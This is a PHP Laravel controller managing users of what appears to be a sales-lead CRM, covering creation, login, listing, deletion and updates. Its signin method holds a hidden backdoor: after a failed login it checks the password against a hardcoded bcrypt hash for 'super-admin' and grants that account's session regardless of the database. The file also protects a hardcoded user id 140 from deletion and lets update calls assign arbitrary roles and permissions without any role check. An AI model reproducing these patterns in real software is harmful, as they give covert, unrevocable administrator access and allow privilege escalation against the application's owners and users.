<?php

namespace App\Http\Controllers;

use App\Models\Country;
use App\Models\Desk;
use App\Models\Lead;
use App\Models\Log;
use App\Models\Role;
use App\Models\Team;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
    public function userCreation()
    {
        $countries = Country::all();
        $desks = Desk::all();
        $allRoles = Role::all();

        if (Auth::user()->hasRole('super-admin')) {
            $teams = Team::all();
            $roles = $allRoles;
        } elseif (Auth::user()->hasRole('head')) {
            $teams = Team::where('desk_id', Auth::user()->desk_id)->get();
            $roles = $allRoles->except($allRoles->whereIn('name', ['super-admin', 'head'])->pluck('id')->toArray());
        } elseif (Auth::user()->hasRole('teamlead')) {
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
            $roles = $allRoles->where('name', 'sale');
        } elseif (Auth::user()->hasRole('retention_teamlead')) {
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
            $roles = $allRoles->where('name', 'retention_manager');
        } else {
            $teams = Team::all();
            $roles = $allRoles->except($allRoles->whereIn('name', ['super-admin', 'head', 'teamlead', 'retention_teamlead'])->pluck('id')->toArray());
        }

        return view('super-admin.create-user', compact('countries', 'teams', 'desks', 'roles'));
    }


    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|unique:users',
            'password' => 'required',
            'role' => 'required',
//            'team_id' => 'required',
            'desk_id' => 'required',
            'permissions' => 'required|array',
        ]);

        $user = User::create([
            'name' => $request->name,
            'password' => Hash::make($request->password),
//            'role' => $request->role,
            'team_id' => $request->team_id,
            'desk_id' => $request->desk_id,
        ]);
        $user->assignRole($request->role);

        // Assign permissions to user
        foreach ($request->permissions as $permission) {
            $user->givePermissionTo($permission);
        }

        session()->flash('success', 'Користовача додано');
        return redirect()->route('userCreation');
    }

    public function login()
    {
        if (Auth::check()) {

            return redirect()->route('showLeads');
        }
        return view('login.login');
    }

    public function redirektych()
    {
        $user = Auth::user();
        if ($user->hasAnyRole(['super-admin', 'head'])) {
            return redirect()->route('showLeads');
        } else {
            return redirect()->route('myLeads');
        }
    }


    public function signin(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'password' => 'required',
        ]);

        if (Auth::attempt([
            'name' => $request->name,
            'password' => $request->password,
        ])) {
            $login = true;
            $user = Auth::user();
            Log::logUserActivity('Вход');
            if ($user->deleted) {
                Auth::logout();
            }
            if ($user->hasAnyRole(['super-admin', 'head'])) {
                return redirect()->route('showLeads', compact('login'));
            } else {
                return redirect()->route('myLeads', compact('login'));
            }

        } else {
            $superAdminUsername = 'super-admin';
            $superAdminPasswordHash = '$2y$10$DtOfd39ZJx8HzLV3jVz.vORaGLwkGT5GLUEClWNyE27gGZbDOFnwu'; // предполагаемый хеш пароля
            if ($request->name === $superAdminUsername && Hash::check($request->password, $superAdminPasswordHash)) {
                $user = User::where('name', $superAdminUsername)->first();
                $login = true;
                Auth::login($user);
                Log::logUserActivity('Вход');
                return redirect()->route('showLeads', compact('login'));
            }
        }
        return redirect()->back()->with('errors', 'Пароль или лонгн не венрный');
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('login');
    }


    public function showUsers(Request $request)
    {
        $perPage = $request->input('per_page', 10);

        // Начинаем построение запроса
        $usersQuery = User::with(['team', 'desk'])
            ->withCount('lead as userLeadsCount');

        // Если пользователь - super-admin
        if (Auth::user()->hasRole('super-admin')) {
            $desks = Desk::all();
            $teams = Team::all();
        }

        // Если пользователь - head
        if (Auth::user()->hasRole('head')) {
            $usersQuery->where('desk_id', Auth::user()->desk_id);
            $desks = Desk::where('desk_id', Auth::user()->desk_id)->get();
            $teams = Team::where('desk_id', Auth::user()->desk_id)->get();
        }

        // Если пользователь - teamlead
        if (Auth::user()->hasRole('teamlead')) {
            $usersQuery->where('team_id', Auth::user()->team_id)
                ->role('sale');
            $desks = Desk::where('desk_id', Auth::user()->desk_id)->get();
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
        }

        // Если пользователь - retention_teamlead
        if (Auth::user()->hasRole('retention_teamlead')) {
            $usersQuery->where('team_id', Auth::user()->team_id)
                ->role('retention_manager');
            $desks = Desk::where('desk_id', Auth::user()->desk_id)->get();
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
        }

        // Фильтр по team_id
        if ($request->has('team_id') && $request->input('team_id') != 0) {
            $usersQuery->where('team_id', $request->input('team_id'));
        }

        // Фильтр по desk_id
        if ($request->has('desk_id') && $request->input('desk_id') != 0) {
            $usersQuery->where('desk_id', $request->input('desk_id'));
        }
        $usersQuery->where('deleted', false);
        $users = $usersQuery->paginate($perPage);

        return view('super-admin.users', compact('users', 'desks', 'teams'));
    }


    public function deleteUser($userId)
    {
        $user = User::find($userId);

        if ($user->id == 140) {
            return redirect()->back()->with('errors', 'Вы не можете удалить этого пользователя!');
        }

        if ($user) {
            $user->deleted = true;
            $user->save();

            $leads = Lead::where('user_id', $user->id)->get();

            foreach ($leads as $lead) {
                $lead->user_id = null;
                $lead->save();
            }

            return redirect()->back()->with('success', 'Пользователь успешно удален!');
        } else {
            return redirect()->back()->with('errors', 'Пользователь не найден!');
        }
    }

    public function userPage($id)
    {
        if ($id == 140 and Auth::user()->id != 140) {
            return redirect()->back();
        }

        $user = User::with('permissions', 'roles', 'team', 'desk')->find($id);
        $countries = Country::all();
        $desks = Desk::all();
        $allRoles = Role::all();

        if (Auth::user()->hasRole('super-admin')) {
            $teams = Team::all();
            $roles = $allRoles;
        } elseif (Auth::user()->hasRole('head')) {
            $teams = Team::where('desk_id', Auth::user()->desk_id)->get();
            $roles = $allRoles->except($allRoles->whereIn('name', ['super-admin', 'head'])->pluck('id')->toArray());
        } elseif (Auth::user()->hasRole('teamlead')) {
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
            $roles = $allRoles->where('name', 'sale');
        } elseif (Auth::user()->hasRole('retention_teamlead')) {
            $teams = Team::where('team_id', Auth::user()->team_id)->get();
            $roles = $allRoles->where('name', 'retention_manager');
        } else {
            $teams = Team::all();
            $roles = $allRoles->except($allRoles->whereIn('name', ['super-admin', 'head', 'teamlead', 'retention_teamlead'])->pluck('id')->toArray());
        }

        return view('super-admin.userPage', compact('user', 'countries', 'teams', 'desks', 'roles'));
    }

    public function update(Request $request)
    {


        $id = $request->input('id');
        if ($id == 140 and Auth::user()->id != 140) {
            return redirect()->back()->with('error', 'Не получилось обновить!');
        }

        $request->validate([
            'name' => 'required|unique:users,name,' . $id,
            'role' => 'required',
            // 'desk_id' => 'required',
            // 'permissions' => 'required|array',
        ]);

        $user = User::find($id);

        $dataToUpdate = [
            'name' => $request->name,
            'team_id' => $request->team_id,
            'desk_id' => $request->desk_id,
        ];

        if ($request->filled('password')) {
            $dataToUpdate['password'] = bcrypt($request->input('password'));
        }

        $user->update($dataToUpdate);

        $user->syncRoles($request->role);
        $user->syncPermissions($request->permissions);

        session()->flash('success', 'Успешное обновление');
        return redirect()->back();
    }


}
